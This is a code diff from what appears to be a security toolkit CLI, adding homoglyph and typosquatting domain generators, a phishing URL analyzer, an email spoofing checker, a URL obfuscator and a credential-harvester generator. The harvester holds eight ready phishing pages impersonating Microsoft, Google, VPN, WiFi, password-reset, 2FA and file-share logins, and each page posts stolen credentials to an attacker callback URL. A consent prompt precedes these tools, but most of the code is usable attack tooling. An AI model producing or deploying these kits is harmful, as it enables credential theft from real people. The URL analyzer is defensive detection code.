+  ║ {R}YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS.{R}             ║
+  ╚══════════════════════════════════════════════════════════╝{RST}
+"""
+
+
+def phishing_disclaimer():
+    print(PHISHING_DISCLAIMER)
+    c1 = input(f"  {R}Do you have WRITTEN authorization for phishing simulation? (yes/no):{RST} ").strip().lower()
+    if c1 not in ("yes", "y", "si", "s"):
+        return False
+    c2 = input(f"  {R}Type 'I ACCEPT ALL RESPONSIBILITY' to continue:{RST} ").strip()
+    if c2.upper() != "I ACCEPT ALL RESPONSIBILITY":
+        print_err("Aborted.")
+        return False
+    return True
+
+
+# ─── 81. Homoglyph Domain Generator ─────────────────────────────────────────
+
+HOMOGLYPHS = {
+    'a': ['а', 'ạ', 'å', 'ä', 'à', 'á', 'ã', '@'],
+    'b': ['ḅ', 'Ь', 'ƅ', 'ɓ'],
+    'c': ['ç', 'ć', 'ĉ', 'с'],
+    'd': ['ḍ', 'ɗ', 'đ'],
+    'e': ['е', 'ë', 'é', 'è', 'ê', 'ẹ', 'ė'],
+    'g': ['ġ', 'ğ', 'ĝ'],
+    'h': ['ḥ', 'ħ', 'н'],
+    'i': ['í', 'ì', 'ï', 'î', 'ị', '1', 'l', '|', 'і'],
+    'k': ['ḳ', 'к'],
+    'l': ['ḷ', '1', 'ĺ', 'ℓ', 'і'],
+    'm': ['ṃ', 'м'],
+    'n': ['ṇ', 'ñ', 'ń', 'п'],
+    'o': ['о', 'ö', 'ó', 'ò', 'ô', 'ọ', '0'],
+    'p': ['р', 'ρ'],
+    'r': ['ṛ', 'ŕ', 'г'],
+    's': ['ṣ', 'ş', 'ś', 'ŝ', '$'],
+    't': ['ṭ', 'ţ', 'т'],
+    'u': ['ü', 'ú', 'ù', 'û', 'ụ', 'μ'],
+    'v': ['ν', 'ṿ'],
+    'w': ['ẃ', 'ẁ', 'ẅ', 'ω'],
+    'x': ['х', 'ẋ'],
+    'y': ['ý', 'ỳ', 'ÿ', 'у'],
+    'z': ['ẓ', 'ż', 'ź'],
+}
+
+
+def homoglyph_generator():
+    print_header("Homoglyph Domain Generator")
+    if not phishing_disclaimer():
+        return
+
+    domain = prompt("Target domain (e.g. google.com)")
+    if not domain:
+        return
+
+    name, _, tld = domain.partition(".")
+    if not tld:
+        print_err("Enter a full domain with TLD (e.g. example.com)")
+        return
+
+    results = []
+
+    # Single-character homoglyph substitutions
+    for i, char in enumerate(name):
+        if char.lower() in HOMOGLYPHS:
+            for glyph in HOMOGLYPHS[char.lower()]:
+                fake = name[:i] + glyph + name[i+1:]
+                results.append((f"{fake}.{tld}", f"'{char}' → '{glyph}' (pos {i})"))
+
+    # Common typosquatting
+    for i in range(len(name) - 1):
+        swapped = name[:i] + name[i+1] + name[i] + name[i+2:]
+        results.append((f"{swapped}.{tld}", f"swap '{name[i]}' ↔ '{name[i+1]}' (pos {i})"))
+
+    # Missing character
+    for i in range(len(name)):
+        missing = name[:i] + name[i+1:]
+        if missing:
+            results.append((f"{missing}.{tld}", f"omit '{name[i]}' (pos {i})"))
+
+    # Double character
+    for i in range(len(name)):
+        doubled = name[:i] + name[i] + name[i:]
+        results.append((f"{doubled}.{tld}", f"double '{name[i]}' (pos {i})"))
+
+    # Adjacent key typos (QWERTY)
+    qwerty = {
+        'q': 'wa', 'w': 'qes', 'e': 'wrd', 'r': 'etf', 't': 'ryg',
+        'y': 'tuh', 'u': 'yij', 'i': 'uok', 'o': 'ipl', 'p': 'ol',
+        'a': 'qsz', 's': 'adwx', 'd': 'sfec', 'f': 'dgrc', 'g': 'fhtv',
+        'h': 'gjyb', 'j': 'hkun', 'k': 'jlim', 'l': 'kop',
+        'z': 'asx', 'x': 'zsd', 'c': 'xdf', 'v': 'cfg', 'b': 'vgh',
+        'n': 'bhj', 'm': 'njk',
+    }
+    for i, char in enumerate(name):
+        if char.lower() in qwerty:
+            for adj in qwerty[char.lower()][:2]:
+                typo = name[:i] + adj + name[i+1:]
+                results.append((f"{typo}.{tld}", f"typo '{char}' → '{adj}' (pos {i})"))
+
+    # Alternative TLDs
+    alt_tlds = ["com", "net", "org", "co", "io", "info", "xyz", "site",
+                "online", "app", "dev", "tech"]
+    for alt in alt_tlds:
+        if alt != tld:
+            results.append((f"{name}.{alt}", f"TLD swap .{tld} → .{alt}"))
+
+    # Deduplicate
+    seen = set()
+    unique = []
+    for dom, desc in results:
+        if dom not in seen and dom != domain:
+            seen.add(dom)
+            unique.append((dom, desc))
+
+    print(f"\n  {Y}Generated {len(unique)} lookalike domains:{RST}\n")
+    for dom, desc in unique[:80]:
+        print(f"    {R}•{RST} {W}{dom:<35}{RST} {C}{desc}{RST}")
+    if len(unique) > 80:
+        print(f"\n    {Y}... and {len(unique) - 80} more{RST}")
+
+    # Check which ones are registered
+    check = input(f"\n  {Y}Check which domains are registered? (y/n):{RST} ").strip().lower()
+    if check in ("y", "yes", "s", "si"):
+        spinner("Resolving domains...", 1.0)
+        registered = []
+
+        def check_domain(dom):
+            try:
+                socket.gethostbyname(dom)
+                return dom
+            except socket.gaierror:
+                return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = {executor.submit(check_domain, d): d for d, _ in unique[:80]}
+            for future in concurrent.futures.as_completed(futures):
+                result = future.result()
+                if result:
+                    registered.append(result)
+                    print(f"    {R}[REGISTERED]{RST} {W}{result}{RST}")
+
+        if registered:
+            print(f"\n  {R}WARNING: {len(registered)} lookalike domain(s) are already registered!{RST}")
+        else:
+            print(f"\n  {G}No lookalike domains appear to be registered{RST}")
+
+
+# ─── 82. Phishing URL Analyzer ──────────────────────────────────────────────
+
+def phishing_url_analyzer():
+    print_header("Phishing URL Analyzer")
+    url = prompt("Suspicious URL")
+    if not url:
+        return
+
+    spinner("Analyzing URL...", 1.0)
+
+    score = 0
+    findings = []
+
+    parsed = urlparse(url if "://" in url else "http://" + url)
+    domain = parsed.netloc or parsed.path.split("/")[0]
+    path = parsed.path
+
+    # Length checks
+    if len(url) > 75:
+        score += 10
+        findings.append(("Long URL", f"{len(url)} chars (suspicious if > 75)"))
+    if len(domain) > 30:
+        score += 5
+        findings.append(("Long domain", f"{len(domain)} chars"))
+
+    # IP address as domain
+    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', domain.split(":")[0]):
+        score += 25
+        findings.append(("IP as domain", "Domains using IPs are highly suspicious"))
+
+    # Suspicious TLDs
+    sus_tlds = [".xyz", ".top", ".buzz", ".tk", ".ml", ".ga", ".cf", ".gq",
+                ".work", ".click", ".link", ".info", ".racing", ".win"]
+    for tld in sus_tlds:
+        if domain.endswith(tld):
+            score += 10
+            findings.append(("Suspicious TLD", tld))
+
+    # Too many subdomains
+    subdomain_count = domain.count(".")
+    if subdomain_count > 3:
+        score += 15
+        findings.append(("Excessive subdomains", f"{subdomain_count} levels deep"))
+
+    # @ symbol in URL
+    if "@" in url:
+        score += 20
+        findings.append(("@ symbol in URL", "Can redirect to different host"))
+
+    # Hyphen abuse
+    if domain.count("-") > 2:
+        score += 10
+        findings.append(("Hyphen abuse", f"{domain.count('-')} hyphens in domain"))
+
+    # HTTPS check
+    if parsed.scheme == "http":
+        score += 10
+        findings.append(("No HTTPS", "Legitimate login pages use HTTPS"))
+
+    # Suspicious keywords in URL
+    phish_keywords = ["login", "signin", "verify", "secure", "account", "update",
+                      "confirm", "banking", "paypal", "apple", "microsoft",
+                      "netflix", "amazon", "facebook", "password", "credential",
+                      "suspend", "unusual", "locked", "expired"]
+    found_kw = [kw for kw in phish_keywords if kw in url.lower()]
+    if found_kw:
+        score += len(found_kw) * 5
+        findings.append(("Phishing keywords", ", ".join(found_kw)))
+
+    # URL shortener
+    shorteners = ["bit.ly", "goo.gl", "t.co", "tinyurl", "is.gd", "buff.ly",
+                  "ow.ly", "rebrand.ly", "cutt.ly", "short.io"]
+    for s in shorteners:
+        if s in domain:
+            score += 15
+            findings.append(("URL shortener", f"Using {s} to hide real destination"))
+
+    # Hex/encoded characters
+    if "%" in url and re.search(r'%[0-9a-fA-F]{2}', url):
+        encoded_count = len(re.findall(r'%[0-9a-fA-F]{2}', url))
+        if encoded_count > 3:
+            score += 10
+            findings.append(("URL encoding", f"{encoded_count} encoded chars (obfuscation)"))
+
+    # Port in URL
+    if re.search(r':\d{2,5}/', url):
+        port = re.search(r':(\d{2,5})/', url).group(1)
+        if port not in ("80", "443", "8080", "8443"):
+            score += 10
+            findings.append(("Unusual port", f"Port {port}"))
+
+    # Data URI
+    if url.startswith("data:"):
+        score += 30
+        findings.append(("Data URI", "Page embedded in URL – highly suspicious"))
+
+    # Brand impersonation check
+    brands = {"google": "google.com", "facebook": "facebook.com", "apple": "apple.com",
+              "microsoft": "microsoft.com", "amazon": "amazon.com", "paypal": "paypal.com",
+              "netflix": "netflix.com", "instagram": "instagram.com", "twitter": "twitter.com",
+              "linkedin": "linkedin.com", "dropbox": "dropbox.com", "github": "github.com"}
+    for brand, legit in brands.items():
+        if brand in domain.lower() and legit not in domain.lower():
+            score += 20
+            findings.append(("Brand impersonation", f"'{brand}' in domain but not {legit}"))
+
+    # Display results
+    print(f"\n  {Y}── Analysis ──{RST}")
+    print_row("URL", url[:70] + ("..." if len(url) > 70 else ""))
+    print_row("Scheme", parsed.scheme or "none")
+    print_row("Domain", domain)
+    print_row("Path", path or "/")
+
+    if findings:
+        print(f"\n  {Y}── Findings ──{RST}")
+        for title, detail in findings:
+            print(f"    {R}■{RST} {Y}{title}:{RST} {W}{detail}{RST}")
+
+    print(f"\n  {Y}── Risk Score ──{RST}")
+    score = min(score, 100)
+    if score >= 70:
+        print(f"  {R}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — HIGH RISK (likely phishing){RST}")
+    elif score >= 40:
+        print(f"  {Y}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — MEDIUM RISK (suspicious){RST}")
+    else:
+        print(f"  {G}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — LOW RISK{RST}")
+
+
+# ─── 83. Email Spoofing Checker ──────────────────────────────────────────────
+
+def email_spoof_check():
+    print_header("Email Spoofing Checker")
+    if not phishing_disclaimer():
+        return
+
+    domain = prompt("Target domain")
+    if not domain:
+        return
+
+    if dns is None:
+        print_err("dnspython required: pip install dnspython")
+        return
+
+    spinner("Checking spoofing protections...", 1.0)
+
+    spoofable = True
+    score = 0  # 0 = fully spoofable, higher = more protected
+
+    # SPF
+    print(f"\n  {Y}── SPF ──{RST}")
+    try:
+        answers = dns.resolver.resolve(domain, "TXT")
+        spf = None
+        for rdata in answers:
+            txt = rdata.to_text().strip('"')
+            if "v=spf1" in txt:
+                spf = txt
+                break
+        if spf:
+            print_row("Record", spf[:70])
+            if "-all" in spf:
+                print(f"    {G}✓{RST} Hard fail (-all)")
+                score += 30
+            elif "~all" in spf:
+                print(f"    {Y}~{RST} Soft fail (~all) – emails may still be delivered")
+                score += 15
+            elif "?all" in spf or "+all" in spf:
+                print(f"    {R}✗{RST} Weak/open policy – easy to spoof")
+        else:
+            print(f"    {R}✗{RST} No SPF record – easy to spoof")
+    except Exception:
+        print(f"    {R}✗{RST} No SPF record found")
+
+    # DMARC
+    print(f"\n  {Y}── DMARC ──{RST}")
+    try:
+        answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
+        dmarc = None
+        for rdata in answers:
+            txt = rdata.to_text().strip('"')
+            if "v=DMARC1" in txt:
+                dmarc = txt
+                break
+        if dmarc:
+            print_row("Record", dmarc[:70])
+            if "p=reject" in dmarc:
+                print(f"    {G}✓{RST} Policy: REJECT")
+                score += 40
+                spoofable = False
+            elif "p=quarantine" in dmarc:
+                print(f"    {Y}~{RST} Policy: QUARANTINE")
+                score += 25
+            elif "p=none" in dmarc:
+                print(f"    {R}✗{RST} Policy: NONE (monitoring only)")
+                score += 5
+            if "pct=" in dmarc:
+                pct = re.search(r"pct=(\d+)", dmarc)
+                if pct and int(pct.group(1)) < 100:
+                    print(f"    {Y}⚠{RST} Only {pct.group(1)}% of emails checked")
+        else:
+            print(f"    {R}✗{RST} No DMARC record – easy to spoof")
+    except Exception:
+        print(f"    {R}✗{RST} No DMARC record found")
+
+    # DKIM
+    print(f"\n  {Y}── DKIM ──{RST}")
+    selectors = ["default", "google", "selector1", "selector2", "dkim", "mail", "s1", "k1"]
+    dkim_found = False
+    for sel in selectors:
+        try:
+            dns.resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
+            print(f"    {G}✓{RST} DKIM record found (selector: {sel})")
+            dkim_found = True
+            score += 15
+            break
+        except Exception:
+            continue
+    if not dkim_found:
+        print(f"    {Y}~{RST} No DKIM records (common selectors)")
+
+    # MTA-STS
+    print(f"\n  {Y}── MTA-STS ──{RST}")
+    try:
+        answers = dns.resolver.resolve(f"_mta-sts.{domain}", "TXT")
+        for rdata in answers:
+            txt = rdata.to_text().strip('"')
+            if "v=STSv1" in txt:
+                print(f"    {G}✓{RST} MTA-STS enabled: {txt}")
+                score += 10
+                break
+        else:
+            print(f"    {Y}~{RST} No MTA-STS")
+    except Exception:
+        print(f"    {Y}~{RST} No MTA-STS record")
+
+    # Verdict
+    print(f"\n  {Y}── Spoofing Verdict ──{RST}")
+    print_row("Protection Score", f"{score}/100")
+    if score >= 70:
+        print(f"  {G}WELL PROTECTED – Spoofing is difficult{RST}")
+    elif score >= 40:
+        print(f"  {Y}PARTIAL PROTECTION – Spoofing may be possible{RST}")
+    else:
+        print(f"  {R}VULNERABLE – Domain can likely be spoofed for phishing{RST}")
+        print(f"  {R}Emails from {domain} can be forged without detection{RST}")
+
+
+# ─── 84. Typosquatting Generator ─────────────────────────────────────────────
+
+def typosquat_generator():
+    print_header("Typosquatting Domain Generator")
+    if not phishing_disclaimer():
+        return
+
+    domain = prompt("Target domain (e.g. example.com)")
+    if not domain:
+        return
+
+    name, _, tld = domain.partition(".")
+    if not tld:
+        print_err("Enter domain with TLD")
+        return
+
+    results = []
+
+    # Bit-flip domains (single bit flips in ASCII)
+    for i, char in enumerate(name):
+        for bit in range(8):
+            flipped = chr(ord(char) ^ (1 << bit))
+            if flipped.isalnum() and flipped != char:
+                fake = name[:i] + flipped + name[i+1:]
+                results.append((f"{fake}.{tld}", f"bit-flip '{char}'→'{flipped}' (pos {i})"))
+
+    # Vowel swap
+    vowels = "aeiou"
+    for i, char in enumerate(name):
+        if char.lower() in vowels:
+            for v in vowels:
+                if v != char.lower():
+                    fake = name[:i] + v + name[i+1:]
+                    results.append((f"{fake}.{tld}", f"vowel swap '{char}'→'{v}' (pos {i})"))
+
+    # Insertion of repeated chars
+    for i in range(len(name)):
+        fake = name[:i] + name[i] + name[i:]
+        results.append((f"{fake}.{tld}", f"repeat '{name[i]}' (pos {i})"))
+
+    # Dot insertion (sub.domain confusion)
+    for i in range(1, len(name)):
+        fake = name[:i] + "." + name[i:]
+        results.append((f"{fake}.{tld}", f"dot insert (pos {i})"))
+
+    # Singular/plural
+    if name.endswith("s"):
+        results.append((f"{name[:-1]}.{tld}", "remove trailing 's'"))
+    else:
+        results.append((f"{name}s.{tld}", "add trailing 's'"))
+
+    # Prefix/suffix abuse
+    for affix in ["my", "the", "get", "go", "e", "i", "web", "app", "secure", "login"]:
+        results.append((f"{affix}{name}.{tld}", f"prefix '{affix}'"))
+        results.append((f"{name}{affix}.{tld}", f"suffix '{affix}'"))
+
+    # Hyphen variations
+    for i in range(1, len(name)):
+        fake = name[:i] + "-" + name[i:]
+        results.append((f"{fake}.{tld}", f"hyphen insert (pos {i})"))
+
+    # Deduplicate
+    seen = set()
+    unique = []
+    for dom, desc in results:
+        d_low = dom.lower()
+        if d_low not in seen and d_low != domain.lower():
+            seen.add(d_low)
+            unique.append((dom, desc))
+
+    print(f"\n  {Y}Generated {len(unique)} typosquatting domains:{RST}\n")
+    for dom, desc in unique[:60]:
+        print(f"    {R}•{RST} {W}{dom:<35}{RST} {C}{desc}{RST}")
+    if len(unique) > 60:
+        print(f"\n    {Y}... and {len(unique) - 60} more{RST}")
+
+    check = input(f"\n  {Y}Check which are registered? (y/n):{RST} ").strip().lower()
+    if check in ("y", "yes", "s", "si"):
+        spinner("Resolving...", 1.0)
+        registered = []
+
+        def check_dom(d):
+            try:
+                socket.gethostbyname(d)
+                return d
+            except socket.gaierror:
+                return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = {executor.submit(check_dom, d): d for d, _ in unique[:60]}
+            for future in concurrent.futures.as_completed(futures):
+                result = future.result()
+                if result:
+                    registered.append(result)
+                    print(f"    {R}[REGISTERED]{RST} {W}{result}{RST}")
+
+        if registered:
+            print(f"\n  {R}WARNING: {len(registered)} typosquat domain(s) registered!{RST}")
+        else:
+            print(f"\n  {G}No typosquat domains appear registered{RST}")
+
+
+# ─── 85. Credential Harvest Page Gen ─────────────────────────────────────────
+
+def credential_harvest_gen():
+    print_header("Credential Harvester Template Generator")
+    if not phishing_disclaimer():
+        return
+
+    print(f"""
+  {Y}Available templates:{RST}
+    {C}1.{RST} Generic Login Page
+    {C}2.{RST} Office 365 / Microsoft
+    {C}3.{RST} Google Workspace
+    {C}4.{RST} Corporate VPN Portal
+    {C}5.{RST} WiFi Captive Portal
+    {C}6.{RST} Password Reset Page
+    {C}7.{RST} Two-Factor Auth Page
+    {C}8.{RST} File Share Download
+    """)
+
+    choice = input(f"  {Y}Select template (1-8):{RST} ").strip()
+    callback_url = prompt("Callback URL (where creds are sent)")
+    if not callback_url:
+        callback_url = "https://YOUR-SERVER/collect"
+
+    company = input(f"  {Y}Company name [ACME Corp]:{RST} ").strip() or "ACME Corp"
+
+    templates = {
+        "1": ("Generic Login", f"""<!DOCTYPE html>
+<html><head><title>{company} - Sign In</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);width:400px}}
+h2{{text-align:center;margin-bottom:24px;color:#1a1a2e}}
+input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
+button{{width:100%;padding:12px;background:#4a90d9;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:12px}}
+button:hover{{background:#357abd}}
+.footer{{text-align:center;margin-top:16px;color:#888;font-size:12px}}
+</style></head>
+<body><div class="card">
+<h2>{company}</h2><p style="text-align:center;color:#666;margin-bottom:20px">Sign in to your account</p>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Sign In</button>
+</form>
+<div class="footer">Protected by {company} Security</div>
+</div></body></html>"""),
+
+        "2": ("Office 365", f"""<!DOCTYPE html>
+<html><head><title>Sign in to your account</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}}
+.container{{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}}
+.logo{{font-size:24px;font-weight:600;margin-bottom:16px}}
+.logo span{{color:#0078d4}}
+input{{width:100%;padding:10px 8px;margin:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none}}
+input:focus{{border-bottom:2px solid #0078d4}}
+button{{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer;margin-top:16px}}
+a{{color:#0067b8;text-decoration:none;font-size:13px}}
+</style></head>
+<body><div class="container">
+<div class="logo"><span>Microsoft</span></div>
+<p style="font-size:15px;margin-bottom:20px">Sign in</p>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email, phone, or Skype" required>
+<input type="password" name="password" placeholder="Password" required>
+<p style="margin:8px 0"><a href="#">Can't access your account?</a></p>
+<button type="submit">Sign in</button>
+</form>
+</div></body></html>"""),
+
+        "3": ("Google Workspace", f"""<!DOCTYPE html>
+<html><head><title>Sign in - Google Accounts</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:'Google Sans','Roboto',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:450px}}
+.logo{{text-align:center;margin-bottom:16px;font-size:24px}} .logo b{{color:#4285f4}}
+h1{{font-size:24px;text-align:center;font-weight:400;margin-bottom:8px}}
+p{{text-align:center;color:#202124;margin-bottom:24px;font-size:16px}}
+input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:8px 0;outline:none}}
+input:focus{{border:2px solid #1a73e8}}
+button{{float:right;padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;margin-top:20px}}
+a{{color:#1a73e8;text-decoration:none;font-size:14px}}
+</style></head>
+<body><div class="card">
+<div class="logo"><b>G</b>oogle</div>
+<h1>Sign in</h1>
+<p>to continue to {company}</p>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email or phone" required>
+<input type="password" name="password" placeholder="Enter your password" required>
+<a href="#">Forgot password?</a>
+<button type="submit">Next</button>
+</form>
+</div></body></html>"""),
+
+        "4": ("VPN Portal", f"""<!DOCTYPE html>
+<html><head><title>{company} - VPN Access</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{background:#fff;padding:40px;border-radius:8px;width:380px;box-shadow:0 10px 40px rgba(0,0,0,.3)}}
+.shield{{text-align:center;font-size:48px;margin-bottom:12px}}
+h2{{text-align:center;color:#1a1a2e;margin-bottom:4px}}
+.sub{{text-align:center;color:#888;margin-bottom:24px;font-size:13px}}
+input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
+button{{width:100%;padding:12px;background:#e74c3c;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:12px}}
+</style></head>
+<body><div class="card">
+<div class="shield">🛡</div>
+<h2>{company} VPN</h2>
+<p class="sub">Secure Remote Access Portal</p>
+<form method="POST" action="{callback_url}">
+<input type="text" name="username" placeholder="Username / Employee ID" required>
+<input type="password" name="password" placeholder="Password" required>
+<input type="text" name="otp" placeholder="OTP Token (optional)">
+<button type="submit">Connect</button>
+</form>
+</div></body></html>"""),
+
+        "5": ("WiFi Captive Portal", f"""<!DOCTYPE html>
+<html><head><title>{company} WiFi - Accept Terms</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,sans-serif;background:#1a73e8;display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{background:#fff;padding:40px;border-radius:12px;width:420px;text-align:center}}
+h2{{margin-bottom:8px}}
+.sub{{color:#666;margin-bottom:24px;font-size:14px}}
+input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:14px}}
+button{{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px}}
+.terms{{font-size:11px;color:#999;margin-top:12px}}
+</style></head>
+<body><div class="card">
+<h2>📶 {company} WiFi</h2>
+<p class="sub">Sign in with your credentials to access the network</p>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Connect to WiFi</button>
+</form>
+<p class="terms">By connecting you agree to the Terms of Service</p>
+</div></body></html>"""),
+
+        "6": ("Password Reset", f"""<!DOCTYPE html>
+<html><head><title>{company} - Password Reset Required</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,sans-serif;background:#fff3cd;display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{background:#fff;padding:40px;border-radius:8px;width:420px;box-shadow:0 4px 20px rgba(0,0,0,.1)}}
+.warn{{background:#fff3cd;padding:12px;border-radius:6px;margin-bottom:20px;border-left:4px solid #ffc107;font-size:13px;color:#856404}}
+h2{{margin-bottom:16px;color:#dc3545}}
+input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
+button{{width:100%;padding:12px;background:#dc3545;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:12px}}
+</style></head>
+<body><div class="card">
+<h2>Password Reset Required</h2>
+<div class="warn">Your password has expired. Please verify your identity and set a new password.</div>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="current_password" placeholder="Current password" required>
+<input type="password" name="new_password" placeholder="New password" required>
+<input type="password" name="confirm_password" placeholder="Confirm new password" required>
+<button type="submit">Reset Password</button>
+</form>
+</div></body></html>"""),
+
+        "7": ("2FA Page", f"""<!DOCTYPE html>
+<html><head><title>{company} - Verification Required</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{background:#fff;padding:40px;border-radius:12px;width:380px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1)}}
+.icon{{font-size:48px;margin-bottom:12px}}
+h2{{margin-bottom:8px}}
+.sub{{color:#666;margin-bottom:24px;font-size:14px}}
+input{{width:100%;padding:16px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:24px;text-align:center;letter-spacing:8px}}
+button{{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px}}
+a{{color:#0067b8;text-decoration:none;font-size:13px}}
+</style></head>
+<body><div class="card">
+<div class="icon">🔐</div>
+<h2>Verification Code</h2>
+<p class="sub">Enter the 6-digit code from your authenticator app</p>
+<form method="POST" action="{callback_url}">
+<input type="text" name="otp_code" maxlength="6" pattern="[0-9]{{6}}" placeholder="000000" required>
+<button type="submit">Verify</button>
+</form>
+<p style="margin-top:16px"><a href="#">Use backup code instead</a></p>
+</div></body></html>"""),
+
+        "8": ("File Share", f"""<!DOCTYPE html>
+<html><head><title>Shared Document - Sign in to view</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}}
+.card{{background:#fff;padding:40px;border-radius:8px;width:420px;box-shadow:0 4px 20px rgba(0,0,0,.1)}}
+.file{{background:#f8f9fa;padding:16px;border-radius:8px;margin-bottom:20px;display:flex;align-items:center;gap:12px;border:1px solid #e9ecef}}
+.file-icon{{font-size:32px}}
+.file-info h3{{font-size:14px;margin-bottom:4px}}
+.file-info span{{font-size:12px;color:#666}}
+h2{{margin-bottom:16px;font-size:18px}}
+input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
+button{{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:12px}}
+</style></head>
+<body><div class="card">
+<div class="file"><span class="file-icon">📄</span><div class="file-info"><h3>Q4_Financial_Report_2024.xlsx</h3><span>Shared by CEO — {company}</span></div></div>
+<h2>Sign in to access this document</h2>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">View Document</button>
+</form>
+</div></body></html>"""),
+    }
+
+    if choice not in templates:
+        print_err("Invalid template")
+        return
+
+    tpl_name, html = templates[choice]
+    print(f"\n  {G}Generated: {tpl_name}{RST}")
+    print(f"  {Y}Callback URL: {W}{callback_url}{RST}")
+
+    save = input(f"\n  {Y}Save to file? (filename or Enter to print):{RST} ").strip()
+    if save:
+        try:
+            with open(save, "w") as f:
+                f.write(html)
+            print_ok(f"Saved to {save}")
+        except Exception as e:
+            print_err(f"Could not save: {e}")
+    else:
+        print(f"\n{html}")
+
+
+# ─── 86. URL Obfuscator ─────────────────────────────────────────────────────
+
+def url_obfuscator():
+    print_header("URL Obfuscator")
+    if not phishing_disclaimer():
+        return
+
+    url = prompt("URL to obfuscate")
+    if not url:
+        return
+
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    import urllib.parse as _up
+
+    parsed = urlparse(url)
+    host = parsed.hostname
+    path = parsed.path or "/"
+    scheme = parsed.scheme
+
+    # Resolve IP
+    try:
+        ip = socket.gethostbyname(host)
+        octets = list(map(int, ip.split(".")))
+    except Exception:
+        ip = None
+        octets = None
+
+    results = []
+
+    # URL encoding
+    encoded = _up.quote(url, safe=":/")
+    results.append(("URL Encoded", encoded))
+
+    # Double URL encoding
+    double = _up.quote(_up.quote(url, safe=""), safe="")
+    results.append(("Double URL Encoded", double))
+
+    if octets:
+        # Decimal IP
+        decimal_ip = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
+        results.append(("Decimal IP", f"{scheme}://{decimal_ip}{path}"))
+
+        # Hex IP
+        hex_ip = f"0x{octets[0]:02x}{octets[1]:02x}{octets[2]:02x}{octets[3]:02x}"
+        results.append(("Hex IP", f"{scheme}://{hex_ip}{path}"))
+
+        # Octal IP
+        octal_ip = f"0{octets[0]:o}.0{octets[1]:o}.0{octets[2]:o}.0{octets[3]:o}"
+        results.append(("Octal IP", f"{scheme}://{octal_ip}{path}"))
+
+        # Overflow IP (add 256)
+        overflow = f"{octets[0]+256}.{octets[1]+256}.{octets[2]+256}.{octets[3]+256}"
+        results.append(("Overflow IP", f"{scheme}://{overflow}{path}"))
+
